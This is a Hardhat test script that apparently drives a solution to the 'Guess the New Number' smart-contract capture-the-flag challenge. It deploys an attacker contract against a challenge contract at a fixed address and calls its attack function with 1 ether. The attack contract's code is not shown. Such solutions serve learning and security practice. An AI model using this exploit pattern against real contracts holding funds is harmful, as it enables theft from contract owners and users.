import { ethers } from 'hardhat';
import { Contract, Signer } from 'ethers';

let accounts: Signer[];
let eoa: Signer;
let contract: Contract;
let attacker: Contract;

before(async () => {
  accounts = await ethers.getSigners();
  eoa = accounts[0];
  const challengeFactory = await ethers.getContractFactory('GuessTheNewNumberChallenge');
  contract = challengeFactory.attach(`0xc8c8f254687de4E9314a1bF660dD2BE62b316c62`);

  const attackerFactory = await ethers.getContractFactory('GuessTheNewNumberChallengeHack');
  attacker = await attackerFactory.deploy(contract.address, {});
});

it('Attack!!', async function () {
  const tx = await attacker.attack({
    value: ethers.utils.parseEther(`1`),
  });
  const txHash = tx && tx.hash;
  console.log(`Transaction: ${txHash}`);

});
